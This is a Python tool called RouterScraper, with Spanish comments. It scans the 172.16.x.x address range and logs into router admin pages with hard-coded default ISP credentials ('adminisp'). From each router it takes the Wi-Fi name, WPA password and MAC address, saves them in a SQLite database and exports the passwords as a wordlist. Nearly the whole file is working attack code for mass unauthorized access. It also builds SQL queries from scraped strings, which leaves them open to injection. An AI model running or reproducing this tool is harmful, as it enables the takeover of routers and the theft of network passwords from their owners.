import requests, sys
import sqlite3 as sql
from bs4 import BeautifulSoup

DATABASE = 'redes.sqlite3'
VERSION = "0.0.3"

#print("[\033[1;31m▪\033[0m]") # Rojo
#print("[\033[1;33m▪\033[0m]") # Amarillo
#print("[\033[1;32m▪\033[0m]") # Verde
# 👨‍💻 👁️ 🚥 🔎 🔍


def show_banner(): # Muestra el banner del programa
    BANNER = """
    \033[5;1m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠃⠀⠀⠀⠀⠀⠀⠰⣶⡀⠀⠀ \033[0;1m██████╗  ██████╗ ██╗   ██╗████████╗███████╗██████╗
    \033[5;1m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠁⣴⠇⠀⠀⠀⠀⠸⣦⠈⢿⡄⠀ \033[0;1m██╔══██╗██╔═══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗
    \033[5;1m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⢸⡏⢰⡇⠀⠀⢸⡆⢸⡆⢸⡇⠀ \033[0;1m██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██████╔╝
    \033[5;1m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠘⣧⡈⠃\033[0;1m⢰⡆\033[5;1m⠘⢁⣼⠁⣸⡇⠀ \033[0;1m██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██╔══██╗
    \033[5;1m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣄⠘⠃⠀\033[0;1m⢸⡇\033[5;1m⠀⠘⠁⣰⡟⠀⠀ \033[0;1m██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██║  ██║
    \033[5;1m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠃⠀⠀\033[0;1m⢸⡇\033[5;1m⠀⠀⠘⠋⠀⠀⠀ \033[0;1m╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀ ███████╗ ██████╗██████╗  █████╗ ██████╗ ███████╗██████╗ 
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠃⠀⠀⠀⠀⠀⠀⠀ ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
    ⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀ ███████╗██║     ██████╔╝███████║██████╔╝█████╗  ██████╔╝
    ⠀⢸⣿⣟⠉⢻⡟⠉⢻⡟⠉⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀ ╚════██║██║     ██╔══██╗██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
    ⠀⢸⣿⣿⣷⣿⣿⣶⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀ ███████║╚██████╗██║  ██║██║  ██║██║     ███████╗██║  ██║
    ⠀⠈⠉⠉⢉⣉⣉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣉⣉⡉⠉⠉⠁⠀ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
    ⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉\033[0m"""
    print(BANNER)

def show_info(): # Muestra información del programa
   print("[👋] Creado por: \033[1mIamRodion\033[0m (\033[1;4;36mgithub.com/IamRodion\033[0m)")
   print(f"[📌] Versión: {VERSION}")

def show_help(): # Muestra información de ayuda
   print("\n[💡 Uso]: python RouterScraper.py [opciones]")
   print("Opciones:")
   print("  -h, --help\t\tMuestra este menú")
   print('  --get-passwords\tCrea un diccionario "\033[4mpasswords.txt\033[0m" con las contraseñas encontradas')
   print("  --start <red>\t\tEstablece la red de inicio (debe estar entre 8 y 24, default=8)")
   print("  --stop <red>\t\tEstablece la red de fin  (debe estar entre 8 y 24, default=24)")

payload = {
    'username': 'adminisp',
    'psd': 'adminisp'
}

session = requests.Session()
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5)'
           'AppleWebKit 537.36 (KHTML, like Gecko) Chrome',
           'Accept': 'text/html,application/xhtml+xml,application/xml;'
           'q=0.9,image/webp,*/*;q=0.8'}


# Genera un objeto cursor a traves de una base de datos.
def crearCursor(DATABASE):
    conn = None
    try:  # Intenta conectarse a la base de datos.
        # Establece conexión con la base de datos, y en caso de no existir, la crea.
        conn = sql.connect(DATABASE)
    # En caso de no lograr conectar a la DB mostrará el error por pantalla.
    except sql.Error as error:
        print(error)
    finally:  # En caso de lograr conectar, generará el objeto cursor y lo devolverá a traves de return.
        if conn:
            cursor = conn.cursor()
            # Devuelve el objeto cursor y el objeto conn para cerrar la conexión a la base de datos al final.
            return cursor, conn


# Función que realiza una consulta tomando como argumento una query SQL.
def consultarDatos(query):
    # Creando cursor y conexión con la base de datos.
    cursor, conn = crearCursor(DATABASE)
    cursor.execute(query)  # Ejecutar una solicitud con el cursor.
    respuesta = cursor.fetchall()  # Se vuelcan los datos en una variable.
    conn.commit()  # Aplicar cambios.
    conn.close()  # Cerrar conexión.
    return respuesta  # Se devuelven los datos recolectados.


# Función que realiza una consulta tomando como argumento una query SQL.
def consultarDato(query):
    # Creando cursor y conexión con la base de datos.
    cursor, conn = crearCursor(DATABASE)
    cursor.execute(query)  # Ejecutar una solicitud con el cursor.
    respuesta = cursor.fetchone()  # Se vuelcan los datos en una variable.
    conn.commit()  # Aplicar cambios.
    conn.close()  # Cerrar conexión.
    return respuesta  # Se devuelven los datos recolectados.


# Función que realiza una consulta tomando como argumento una query SQL.
def consultarScript(query):
    # Creando cursor y conexión con la base de datos.
    cursor, conn = crearCursor(DATABASE)
    cursor.executescript(query)  # Ejecutar una solicitud con el cursor.
    respuesta = cursor.fetchone()  # Se vuelcan los datos en una variable.
    conn.commit()  # Aplicar cambios.
    conn.close()  # Cerrar conexión.
    return respuesta  # Se devuelven los datos recolectados.


def crearTablas():
    query = '''CREATE TABLE IF NOT EXISTS redes_encontradas(
        id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
        ip TEXT NOT NULL,
        wifi TEXT,
        mac_router TEXT,
        password TEXT,
        url TEXT);
CREATE TABLE IF NOT EXISTS contraseñas(
    id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
    password TEXT UNIQUE NOT NULL);'''
    
    consultarScript(query)


def get_passwords(): # Definir una función que ejecuta la función get_passwords()
    print("[\033[5m🕑\033[0m] Generando diccionaro de contraseñas...")
    datos = consultarDatos("SELECT password FROM contraseñas")
    with open("passwords.txt", "w") as archivo: # Abrir el archivo con la instrucción with
        for tupla in datos:
            contraseña = tupla[0] # Obtener el primer elemento de la tupla, que es la contraseña
            archivo.write(contraseña + "\n") # Escribir la contraseña en el archivo con un salto de línea
    print("[✅] Diccionaro de contraseñas generado ('passwords.txt')")

def obtenerDatos(ip, payload, headers, resumen):
    # Login en el router
    login = session.post(f'http://{ip}/boaform/admin/formLogin', timeout=3, data=payload, headers=headers)
    if login.status_code == 200: # Sí hay conexión con el router

        try: # Intenta conseguir los datos del router 
            # Consulta de SSID y Contraseña
            respuesta = session.get(f'http://{ip}/net_wlan_adv.asp', timeout=3, headers=headers)
            contenido = BeautifulSoup(respuesta.content, 'html.parser') # ['lxml', 'html.parser']
            info = contenido.find('form', attrs={'name': 'formEncrypt'})

            wpaSSID = info.find('option', attrs={'value': '0'}).get_text()
            wpaPSK = info.find('script').get_text()

            inicioPSK = wpaPSK.find('_wpaPSK[0]=') + len('_wpaPSK[0]=') + 1
            finPSK = wpaPSK.find('_rsPort[0]=1812') - 4

            ssid = wpaSSID[len('Root AP - '):]
            psk = wpaPSK[inicioPSK:finPSK]

            # Consulta de MAC
            respuestaMAC = session.get(f'http://{ip}/status_wlan_info_11n.asp', timeout=3, headers=headers)
            contenidoMAC = BeautifulSoup(respuestaMAC.content, 'html.parser')

            infoMAC = contenidoMAC.find('script', attrs={'language': False}).get_text()

            inicioMAC = infoMAC.find('bssid_drv[0]=') + len('bssid_drv[0]=') + 1
            finMAC = infoMAC.find('wlanDisabled[0]') - 4

            mac = infoMAC[inicioMAC:finMAC]

            print(f"[\033[1;32m▪\033[0m] ROUTER ENCONTRADO: \033[1m{ip}\033[0m MAC: \033[1m{mac}\033[0m WIFI: \033[1m{ssid}\033[0m CONTRASEÑA: \033[1m{psk}\033[0m") # Indica que hubo conexión y encontró los datos
            resumen["verde"].append(ip)
            consultarDato(f"INSERT OR IGNORE INTO contraseñas (password) VALUES ('{psk}')") # Almacena la contraseña encontrada en la tabla contraseñas sí no está 

            if consultarDato(f"SELECT * FROM redes_encontradas WHERE ip = '{ip}'"): # Sí ya está registrada la red, actualiza los datos
                query = f"UPDATE redes_encontradas SET ip = '{ip}', wifi = '{ssid}', mac_router = '{mac}', password = '{psk}', url = 'http://{ip}/' WHERE ip = '{ip}';"
                consultarDato(query)

            else: # Sí la red no está registrada, registra sus datos
                query = f"INSERT INTO redes_encontradas (ip, wifi, mac_router, password, url) VALUES ('{ip}', '{ssid}', '{mac}', '{psk}', 'http://{ip}/');"
                consultarDato(query)

        except: # Sí no logra obtener datos del router, indica que se obtuvo conexión pero no datos
            print(f"[\033[1;33m▪\033[0m] ROUTER ENCONTRADO: \033[1m{ip}\033[0m MAC: \033[1m?\033[0m WIFI: \033[1m?\033[0m CONTRASEÑA: \033[1m?\033[0m")
            resumen["amarillo"].append(ip)

            if consultarDato(f"SELECT * FROM redes_encontradas WHERE ip = '{ip}'"): # Sí ya está registrada la red, no modifica nada
                pass

            else: # Sí la red no está registrada, registra los datos que conoce
                query = f"INSERT INTO redes_encontradas (ip, url) VALUES ('{ip}', 'http://{ip}/');" 
                consultarDato(query)

    else: # Sí no logra conexión con el router
        pass



def ejecutarCiclo(net_inicio, net_fin):
    resumen = {
        "rojo" : [],
        "amarillo": [],
        "verde": []
    }

    print(f"\n[\033[5m🔍\033[0m] Empezando escaneo desde \033[1m172.16.{net_inicio}.1\033[0m hasta \033[1m172.16.{net_fin}.254\033[0m")
    try:
        for net in range(net_inicio, net_fin+1):
            for host in range(1, 255):
                ip = f"172.16.{net}.{host}"
                try:
                    obtenerDatos(ip, payload, headers, resumen)
                except KeyboardInterrupt:
                    raise KeyboardInterrupt
                except:
                    print(f"[\033[1;31m▪\033[0m] ROUTER NO ENCONTRADO: \033[1m{ip}\033[0m") # Indica por pantalla que no obtuvo conexión
                    resumen["rojo"].append(ip)
                    if consultarDato(f"SELECT * FROM redes_encontradas WHERE ip = '{ip}'"): # Sí ya está registrada la red, no modifica nada
                        continue
                    else: # Sí la red no está registrada, registra los datos que conoce
                        query = f"INSERT INTO redes_encontradas (ip, url) VALUES ('{ip}', 'http://{ip}/');"
                        consultarDato(query)
    except KeyboardInterrupt:
        print("\n[👋] Cerrando programa...\n")
    
    print(f"[🚥] Resumen del escaneo: \t[\033[1;32m▪\033[0m]{len(resumen['verde'])}\t[\033[1;33m▪\033[0m]{len(resumen['amarillo'])}\t[\033[1;31m▪\033[0m]{len(resumen['rojo'])}")
    print(f"[📄] Las siguientes redes necesitan revisión manual (\033[1;33m▪\033[0m):")
    redes = " ".join(str(x) for x in resumen['amarillo'])
    print(redes)
    # for red in resumen["amarillo"]:
    #     print(red)


def main():
    show_banner()
    show_info()

    crearTablas()

    # Definir las variables start y stop con los valores por defecto
    start = 8
    stop = 24

    # Recorrer los argumentos de la línea de comandos
    for i in range(1, len(sys.argv)):
        # Obtener el argumento actual
        arg = sys.argv[i]
        # Si el argumento es --help o -h, mostrar la ayuda y salir
        if arg == "--help" or arg == "-h":
            show_help()
            sys.exit(0)
        # Si el argumento es --get-passwords, ejecutar la función get_passwords()
        elif arg == "--get-passwords":
            get_passwords()
            sys.exit(0)
        # Si el argumento es --start, obtener el siguiente argumento como la red de inicio
        elif arg == "--start":
            # Verificar que hay un siguiente argumento
            if i + 1 < len(sys.argv):
                # Obtener el siguiente argumento como un entero
                start = int(sys.argv[i + 1])
                # Verificar que la red de inicio está entre 8 y 24
                if start < 8 or start > 24:
                    # Mostrar un mensaje de error y salir
                    print("[\033[1;31m▪\033[0m] La red de inicio debe estar entre 8 y 24")
                    sys.exit(1)
                # Incrementar el índice para saltar el siguiente argumento
                i += 1
            else:
                # Mostrar un mensaje de error y salir
                print("[\033[1;31m▪\033[0m] Falta la red de inicio después de --start")
                sys.exit(1)
        # Si el argumento es --stop, obtener el siguiente argumento como la red de fin
        elif arg == "--stop":
            # Verificar que hay un siguiente argumento
            if i + 1 < len(sys.argv):
                # Obtener el siguiente argumento como un entero
                stop = int(sys.argv[i + 1])
                # Verificar que la red de fin está entre 8 y 24
                if stop < 8 or stop > 24:
                    # Mostrar un mensaje de error y salir
                    print("[\033[1;31m▪\033[0m] La red de fin debe estar entre 8 y 24")
                    sys.exit(1)
                # Incrementar el índice para saltar el siguiente argumento
                i += 1
            else:
                # Mostrar un mensaje de error y salir
                print("[\033[1;31m▪\033[0m] Falta la red de fin después de --stop")
                sys.exit(1)

    # Verificar que la red de inicio es menor que la red de fin
    if start > stop:
        # Mostrar un mensaje de error y salir
        print("[\033[1;31m▪\033[0m] La red de inicio debe ser menor or igual que la red de fin")
        sys.exit(1)

    # Aquí va el resto del código del programa
    #print(start)
    #print(stop)

    ejecutarCiclo(start, stop)

if __name__ == '__main__':
    main()
